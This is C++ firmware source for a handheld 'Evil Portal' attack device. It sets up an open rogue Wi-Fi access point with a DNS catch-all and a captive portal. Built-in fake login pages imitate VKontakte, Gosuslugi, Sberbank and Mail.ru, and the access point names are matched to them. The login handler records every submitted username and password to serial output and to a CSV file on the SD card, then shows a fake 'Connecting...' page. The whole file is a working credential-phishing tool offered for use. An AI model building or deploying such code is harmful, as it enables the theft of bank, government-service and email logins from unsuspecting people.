// ===================================================================
// bySaw Evil Portal
//
// Open rogue AP with DNS catch-all and credential-harvesting captive
// portal. SELECT on the selection screen picks a template (4 built-in
// + up to 8 SD files from /evil_portal/*.html). AP SSID auto-matches
// the chosen theme. SELECT during runtime exits.
// ===================================================================
#include "config.h"
#include "shared.h"
#include "EvilPortal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>

extern TFT_eSPI tft;
extern bool feature_active;
extern bool feature_exit_requested;
bool featureExitButtonPressed();
bool isButtonPressed(int);
bool isButtonPressedEdge(int);
#ifndef BTN_UP
#define BTN_UP    6
#define BTN_DOWN  3
#define BTN_SELECT 7
#endif

namespace EvilPortal {

// ---------------------------------------------------------------
// Built-in templates (PROGMEM)
// ---------------------------------------------------------------

// \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5 (VKontakte)
static const char kHtmlVK[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#e8ecf0;font-family:-apple-system,Helvetica,Arial,sans-serif;"
    "min-height:100vh;display:flex;align-items:center;justify-content:center}"
    ".b{background:#fff;border-radius:8px;padding:36px 28px;width:90%;max-width:360px;"
    "box-shadow:0 1px 3px rgba(0,0,0,.12)}"
    ".logo{text-align:center;font-size:36px;font-weight:900;color:#2787f5;margin-bottom:4px}"
    "h1{text-align:center;font-size:20px;font-weight:600;color:#000;margin-bottom:4px}"
    "p{text-align:center;color:#6d7885;font-size:14px;margin-bottom:22px}"
    "input{width:100%;border:1.5px solid #d3d9de;border-radius:8px;padding:13px 14px;"
    "font-size:16px;margin-bottom:12px;outline:0}"
    "input:focus{border-color:#2787f5}"
    ".btn{width:100%;background:#2787f5;color:#fff;border:0;border-radius:8px;"
    "padding:13px;font-size:16px;font-weight:500;cursor:pointer}"
    ".f{font-size:13px;color:#6d7885;text-align:center;margin-top:16px}"
    ".f a{color:#2787f5;text-decoration:none}"
    "</style></head><body><div class='b'>"
    "<div class='logo'>VK</div>"
    "<h1>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</h1>"
    "<p>\xd0\xb2 \xd0\xb0\xd0\xba\xd0\xba\xd0\xb0\xd1\x83\xd0\xbd\xd1\x82 \xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5</p>"
    "<form method='POST' action='/login'>"
    "<input name='login' placeholder='\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd \xd0\xb8\xd0\xbb\xd0\xb8 email' autocomplete='username'>"
    "<input name='password' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<div class='f'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c? "
    "<a href='#'>\xd0\x92\xd0\xbe\xd1\x81\xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd0\xbe\xd0\xb2\xd0\xb8\xd1\x82\xd1\x8c</a></div>"
    "</div></body></html>";

// \xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8 (Gosuslugi)
static const char kHtmlGosuslugi[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8 \xe2\x80\x94 \xd0\x92\xd1\x85\xd0\xbe\xd0\xb4</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f0f2f5;font-family:Arial,sans-serif}"
    "header{background:#0d4cd3;padding:0 20px;height:56px;display:flex;align-items:center}"
    "header span{color:#fff;font-size:18px;font-weight:700;letter-spacing:-.5px}"
    "header small{color:rgba(255,255,255,.7);font-size:11px;margin-left:6px;font-weight:400}"
    ".w{max-width:400px;margin:40px auto;background:#fff;border-radius:4px;"
    "box-shadow:0 1px 4px rgba(0,0,0,.1);overflow:hidden}"
    ".wh{background:#0d4cd3;padding:20px 24px;color:#fff}"
    ".wh h2{font-size:18px;font-weight:600;margin-bottom:4px}"
    ".wh p{font-size:13px;opacity:.8}"
    ".wb{padding:24px}"
    "label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}"
    "input{width:100%;border:1px solid #c4c8cc;border-radius:4px;padding:11px 13px;"
    "font-size:15px;margin-bottom:18px;outline:0}"
    "input:focus{border-color:#0d4cd3;box-shadow:0 0 0 2px rgba(13,76,211,.15)}"
    ".btn{width:100%;background:#0d4cd3;color:#fff;border:0;border-radius:4px;"
    "padding:12px;font-size:15px;font-weight:600;cursor:pointer}"
    ".note{font-size:12px;color:#6b7280;text-align:center;margin-top:14px}"
    "</style></head><body>"
    "<header><span>\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8</span>"
    "<small>\xd0\x95\xd0\x94\xd0\x98\xd0\x9d\xd0\xab\xd0\x99 \xd0\x9f\xd0\x9e\xd0\xa0\xd0\xa2\xd0\x90\xd0\x9b</small></header>"
    "<div class='w'><div class='wh'>"
    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xbd\xd0\xb0 \xd0\xbf\xd0\xbe\xd1\x80\xd1\x82\xd0\xb0\xd0\xbb</h2>"
    "<p>\xd0\x92\xd0\xb2\xd0\xb5\xd0\xb4\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xb4\xd0\xb0\xd0\xbd\xd0\xbd\xd1\x8b\xd0\xb5 \xd1\x83\xd1\x87\xd1\x91\xd1\x82\xd0\xbd\xd0\xbe\xd0\xb9 \xd0\xb7\xd0\xb0\xd0\xbf\xd0\xb8\xd1\x81\xd0\xb8</p>"
    "</div><div class='wb'>"
    "<form method='POST' action='/login'>"
    "<label>\xd0\xa2\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd, email \xd0\xb8\xd0\xbb\xd0\xb8 СНИЛС</label>"
    "<input name='login' autocomplete='username'>"
    "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
    "<input name='password' type='password' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<p class='note'>\xd0\x97\xd0\xb0\xd1\x89\xd0\xb8\xd1\x89\xd1\x91\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xb5 \xd1\x81\xd0\xbe\xd0\xb5\xd0\xb4\xd0\xb8\xd0\xbd\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd0\xbf\xd0\xbe \xd0\xb3\xd0\xbe\xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd0\xb4\xd0\xb0\xd1\x80\xd1\x82\xd0\xb0\xd0\xbc \xd0\xa0\xd0\xa4</p>"
    "</div></div></body></html>";

// \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd (Sberbank)
static const char kHtmlSberbank[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f5f5f5;font-family:SBSansDisplay,Arial,sans-serif}"
    "header{background:#21a038;padding:0 20px;height:58px;display:flex;align-items:center;gap:10px}"
    ".hlogo{width:32px;height:32px;background:#fff;border-radius:50%;display:flex;"
    "align-items:center;justify-content:center;font-size:18px}"
    ".htitle{color:#fff;font-size:16px;font-weight:700}"
    ".w{max-width:380px;margin:36px auto;background:#fff;border-radius:12px;"
    "box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden}"
    ".wh{padding:24px 24px 16px;border-bottom:1px solid #f0f0f0}"
    ".wh h2{font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:4px}"
    ".wh p{font-size:13px;color:#8c8c8c}"
    ".wb{padding:20px 24px 24px}"
    "label{display:block;font-size:13px;color:#666;margin-bottom:5px}"
    "input{width:100%;border:1.5px solid #e0e0e0;border-radius:8px;padding:12px 14px;"
    "font-size:16px;margin-bottom:16px;outline:0;background:#fafafa}"
    "input:focus{border-color:#21a038;background:#fff}"
    ".btn{width:100%;background:#21a038;color:#fff;border:0;border-radius:8px;"
    "padding:14px;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px}"
    ".note{font-size:12px;color:#aaa;text-align:center;margin-top:14px}"
    "</style></head><body>"
    "<header><div class='hlogo'>\xd0\xa1</div>"
    "<span class='htitle'>\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</span></header>"
    "<div class='w'><div class='wh'>"
    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba \xd0\x9e\xd0\xbd\xd0\xbb\xd0\xb0\xd0\xb9\xd0\xbd</h2>"
    "<p>\xd0\x9b\xd0\xb8\xd1\x87\xd0\xbd\xd1\x8b\xd0\xb9 \xd0\xba\xd0\xb0\xd0\xb1\xd0\xb8\xd0\xbd\xd0\xb5\xd1\x82 \xd0\xb8 \xd1\x83\xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbb\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd1\x81\xd1\x87\xd0\xb5\xd1\x82\xd0\xb0\xd0\xbc\xd0\xb8</p>"
    "</div><div class='wb'>"
    "<form method='POST' action='/login'>"
    "<label>\xd0\x9b\xd0\xbe\xd0\xb3\xd0\xb8\xd0\xbd</label>"
    "<input name='login' placeholder='+7 (___) ___-__-__' autocomplete='username'>"
    "<label>\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c</label>"
    "<input name='password' type='password' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<p class='note'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c? "
    "\xd0\x9f\xd0\xbe\xd0\xb7\xd0\xb2\xd0\xbe\xd0\xbd\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xbd\xd0\xb0 900</p>"
    "</div></div></body></html>";

// Mail.ru
static const char kHtmlMailRu[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Mail.ru \xe2\x80\x94 \xd0\x92\xd1\x85\xd0\xbe\xd0\xb4</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f5f5f5;font-family:Arial,Helvetica,sans-serif}"
    "header{background:#005ff9;padding:0 20px;height:50px;display:flex;"
    "align-items:center;color:#fff;font-size:20px;font-weight:700}"
    ".w{max-width:400px;margin:40px auto;background:#fff;border-radius:8px;"
    "box-shadow:0 1px 6px rgba(0,0,0,.1)}"
    ".wh{padding:22px 24px 16px;border-bottom:1px solid #e8e8e8;text-align:center}"
    ".wh img{display:none}.ico{font-size:40px;margin-bottom:8px}"
    ".wh h2{font-size:18px;font-weight:700;color:#1a1a1a}"
    ".wh p{font-size:13px;color:#888;margin-top:4px}"
    ".wb{padding:20px 24px 24px}"
    "input{width:100%;border:1px solid #d5d5d5;border-radius:6px;padding:11px 13px;"
    "font-size:15px;margin-bottom:14px;outline:0}"
    "input:focus{border-color:#005ff9;box-shadow:0 0 0 2px rgba(0,95,249,.1)}"
    ".btn{width:100%;background:#005ff9;color:#fff;border:0;border-radius:6px;"
    "padding:12px;font-size:16px;font-weight:600;cursor:pointer}"
    ".links{display:flex;justify-content:space-between;margin-top:14px;font-size:13px}"
    ".links a{color:#005ff9;text-decoration:none}"
    "</style></head><body>"
    "<header>Mail.ru</header>"
    "<div class='w'><div class='wh'>"
    "<div class='ico'>\xd0\x9c</div>"
    "<h2>\xd0\x92\xd1\x85\xd0\xbe\xd0\xb4 \xd0\xb2 \xd0\xbf\xd0\xbe\xd1\x87\xd1\x82\xd1\x83</h2>"
    "<p>Mail.ru</p>"
    "</div><div class='wb'>"
    "<form method='POST' action='/login'>"
    "<input name='login' placeholder='\xd0\x98\xd0\xbc\xd1\x8f \xd0\xbf\xd0\xbe\xd0\xbb\xd1\x8c\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd1\x82\xd0\xb5\xd0\xbb\xd1\x8f \xd0\xb8\xd0\xbb\xd0\xb8 \xd1\x82\xd0\xb5\xd0\xbb\xd0\xb5\xd1\x84\xd0\xbe\xd0\xbd' autocomplete='username'>"
    "<input name='password' type='password' placeholder='\xd0\x9f\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c' autocomplete='current-password'>"
    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
    "</form>"
    "<div class='links'>"
    "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
    "<a href='#'>\xd0\xa0\xd0\xb5\xd0\xb3\xd0\xb8\xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd1\x86\xd0\xb8\xd1\x8f</a>"
    "</div></div></div></body></html>";

// ---------------------------------------------------------------
// Portal registry
// ---------------------------------------------------------------

struct Portal {
    const char *name;    // display name (≤14 chars)
    const char *apSsid;  // AP SSID to broadcast
    const char *html;    // PROGMEM ptr, nullptr = SD file
    char sdPath[48];     // path for SD portals
};

static const int MAX_PORTALS = 12;
static Portal s_portals[MAX_PORTALS];
static int s_portalCount = 0;

static void buildPortalList() {
    s_portalCount = 0;

    // built-ins always first (Russian-market templates)
    s_portals[s_portalCount++] = {"\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5",  "VK-WiFi",          kHtmlVK,        {}};
    s_portals[s_portalCount++] = {"\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8",  "Gosuslugi-WiFi",   kHtmlGosuslugi, {}};
    s_portals[s_portalCount++] = {"\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba",           "SberOnline",       kHtmlSberbank,  {}};
    s_portals[s_portalCount++] = {"Mail.ru",                                                                        "MailRu-WiFi",      kHtmlMailRu,    {}};

    // scan SD /evil_portal/*.html
    if (SD.cardType() == CARD_NONE) return;
    SD.mkdir("/evil_portal");
    File dir = SD.open("/evil_portal");
    if (!dir) return;
    while (s_portalCount < MAX_PORTALS) {
        File f = dir.openNextFile();
        if (!f) break;
        const char *fn = f.name();
        int len = strlen(fn);
        if (len >= 5 && strcasecmp(fn + len - 5, ".html") == 0) {
            Portal &p = s_portals[s_portalCount++];
            // derive display name from filename (strip .html, max 14 chars)
            strncpy(p.sdPath, "/evil_portal/", sizeof(p.sdPath) - 1);
            strncat(p.sdPath, fn, sizeof(p.sdPath) - 14 - 1);
            p.sdPath[sizeof(p.sdPath) - 1] = 0;
            // display name = filename without extension
            static char nm[15];
            strncpy(nm, fn, 14);
            nm[14] = 0;
            char *dot = strrchr(nm, '.');
            if (dot) *dot = 0;
            p.name   = nm;
            p.apSsid = "Free WiFi";
            p.html   = nullptr;
        }
        f.close();
    }
    dir.close();
}

// ---------------------------------------------------------------
// Runtime state
// ---------------------------------------------------------------

static const byte DNS_PORT = 53;
static DNSServer  s_dns;
static WebServer  s_web(80);
static File       s_csv;
static bool       s_csvOpen   = false;
static String     s_template;
static String     s_apIp;
static int        s_captured  = 0;
static int        s_hits      = 0;
static volatile bool s_dirty   = true;
static const char *s_portalName = "";
static const char *s_activeApSsid = "";

// ---------------------------------------------------------------
// Template loader
// ---------------------------------------------------------------

static void loadTemplate(int idx) {
    s_template = "";
    if (idx < 0 || idx >= s_portalCount) return;
    const Portal &p = s_portals[idx];
    if (p.html) {
        // PROGMEM — copy to RAM string
        const char *src = p.html;
        s_template.reserve(strlen_P(src) + 1);
        char c;
        while ((c = pgm_read_byte(src++))) s_template += c;
        Serial.printf("[evil] built-in template: %s (%d bytes)\n", p.name, s_template.length());
    } else {
        // SD file
        File f = SD.open(p.sdPath, FILE_READ);
        if (f) {
            size_t sz = f.size();
            if (sz > 24576) sz = 24576;
            s_template.reserve(sz + 1);
            while (f.available() && s_template.length() < sz) s_template += (char)f.read();
            f.close();
            Serial.printf("[evil] SD template: %s (%d bytes)\n", p.sdPath, s_template.length());
        }
    }
}

// ---------------------------------------------------------------
// Web handlers
// ---------------------------------------------------------------

static void handleRoot() {
    s_hits++;
    s_dirty = true;
    s_web.send(200, "text/html", s_template);
}

static void handleRedirect() {
    s_web.sendHeader("Location", "http://" + s_apIp + "/", true);
    s_web.send(302, "text/plain", "");
}

static void handleLogin() {
    String rec = "";
    for (int i = 0; i < s_web.args(); i++) {
        if (i) rec += " | ";
        rec += s_web.argName(i) + "=" + s_web.arg(i);
    }
    Serial.printf("[evil] CAPTURED: %s\n", rec.c_str());
    if (s_csvOpen) {
        s_csv.printf("%lu,%s\n", (unsigned long)(millis() / 1000), rec.c_str());
        s_csv.flush();
    }
    s_captured++;
    s_dirty = true;
    s_web.send(200, "text/html",
        "<html><head><meta http-equiv='refresh' content='4;url=/'></head>"
        "<body style='font-family:Arial;text-align:center;margin-top:60px'>"
        "<h3>Connecting...</h3><p>Please wait while we verify your access.</p>"
        "</body></html>");
}

// ---------------------------------------------------------------
// Display: running portal status
// ---------------------------------------------------------------

static void drawRunning() {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);

    tft.setTextSize(1);
    int y = 44;
    tft.setTextColor(UI_TEXT, UI_BG);
    tft.setCursor(10, y); tft.printf("AP:   %s", s_activeApSsid); y += 16;
    tft.setCursor(10, y); tft.print("IP:   "); tft.print(s_apIp.c_str()); y += 16;
    tft.setCursor(10, y); tft.printf("Tmpl: %s", s_portalName); y += 22;

    tft.setTextColor(UI_OK, UI_BG);
    tft.setTextSize(2);
    tft.setCursor(10, y); tft.printf("Clients: %d", WiFi.softAPgetStationNum()); y += 26;
    tft.setCursor(10, y); tft.printf("Views:   %d", s_hits); y += 26;
    tft.setTextColor(UI_WARN, UI_BG);
    tft.setCursor(10, y); tft.printf("Creds:   %d", s_captured);

    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("SEL: exit", tft.width() / 2, tft.height() - 12, 1);
}

// ---------------------------------------------------------------
// Display: template selection screen
// ---------------------------------------------------------------

static void drawSelect(int sel) {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 6, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("Choose template", tft.width() / 2, 26, 1);

    const int rowH = 28;
    const int top  = 42;
    const int visRows = (tft.height() - top - 18) / rowH;  // ~9
    int start = 0;
    if (sel >= visRows) start = sel - visRows + 1;

    for (int i = start; i < s_portalCount && (i - start) < visRows; i++) {
        int y   = top + (i - start) * rowH;
        bool hi = (i == sel);
        tft.fillRect(0, y, tft.width(), rowH - 2,  hi ? UI_ACCENT : UI_BG);
        tft.setTextColor(hi ? UI_BG : UI_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setTextSize(1);
        tft.setCursor(10, y + 6);
        tft.print(s_portals[i].name);
        tft.setTextColor(hi ? UI_BG : UI_DIM_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setCursor(10, y + 16);
        tft.print(s_portals[i].apSsid);
    }

    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("UP/DN: choose  SEL: launch", tft.width() / 2, tft.height() - 10, 1);
}

// ---------------------------------------------------------------
// run()
// ---------------------------------------------------------------

void run() {
    feature_exit_requested = false;
    // feature_active = false here so featureExitButtonPressed() doesn't
    // consume SELECT on the selection screen
    feature_active = false;

    pauseBackgroundRadioTasks();
    buildPortalList();

    // --- selection screen ---
    int sel = 0;
    drawSelect(sel);
    bool launched = false;
    while (!feature_exit_requested) {
        if (isButtonPressedEdge(BTN_UP)) {
            if (sel > 0) { sel--; drawSelect(sel); }
            while (isButtonPressed(BTN_UP)) delay(10);
        }
        if (isButtonPressedEdge(BTN_DOWN)) {
            if (sel < s_portalCount - 1) { sel++; drawSelect(sel); }
            while (isButtonPressed(BTN_DOWN)) delay(10);
        }
        if (isButtonPressedEdge(BTN_SELECT)) {
            while (isButtonPressed(BTN_SELECT)) delay(10);
            launched = true;
            break;
        }
        delay(20);
    }

    if (!launched || feature_exit_requested) {
        Serial.println("[evil] cancelled at selection");
        return;
    }

    // --- launch portal ---
    feature_active = true;
    s_captured = 0;
    s_hits     = 0;
    s_dirty    = true;
    s_portalName    = s_portals[sel].name;
    s_activeApSsid  = s_portals[sel].apSsid;
    const char *apSsid = s_activeApSsid;

    tft.fillScreen(UI_BG);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.setCursor(10, 40);
    tft.printf("Loading: %s", s_portalName);

    loadTemplate(sel);

    // open CSV log
    if (SD.cardType() != CARD_NONE) {
        SD.mkdir("/evil_portal");
        char path[52];
        snprintf(path, sizeof(path), "/evil_portal/creds-%lu.csv", (unsigned long)(millis() / 1000));
        s_csv = SD.open(path, FILE_WRITE);
        if (s_csv) { s_csvOpen = true; s_csv.print("uptime_s,fields\n"); Serial.printf("[evil] log %s\n", path); }
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAP(apSsid);
    delay(200);
    IPAddress ip = WiFi.softAPIP();
    s_apIp = ip.toString();
    s_dns.start(DNS_PORT, "*", ip);

    s_web.on("/", handleRoot);
    s_web.on("/login", HTTP_POST, handleLogin);
    s_web.on("/login", HTTP_GET,  handleRoot);
    s_web.on("/generate_204",        handleRedirect);
    s_web.on("/gen_204",             handleRedirect);
    s_web.on("/hotspot-detect.html", handleRoot);
    s_web.on("/ncsi.txt",            handleRedirect);
    s_web.on("/connecttest.txt",     handleRedirect);
    s_web.onNotFound(handleRoot);
    s_web.begin();
    Serial.printf("[evil] AP '%s' up at %s (template: %s)\n", apSsid, ip.toString().c_str(), s_portalName);

    drawRunning();

    uint32_t lastDraw  = millis();
    int      lastClients = -1;
    while (!feature_exit_requested && !featureExitButtonPressed()) {
        s_dns.processNextRequest();
        s_web.handleClient();
        int clients = WiFi.softAPgetStationNum();
        if (s_dirty || clients != lastClients || millis() - lastDraw > 1000) {
            drawRunning();
            s_dirty      = false;
            lastClients  = clients;
            lastDraw     = millis();
        }
        delay(2);
    }

    s_web.stop();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
    Serial.printf("[evil] stopped: %d creds, %d views, template=%s\n", s_captured, s_hits, s_portalName);
}

}  // namespace EvilPortal
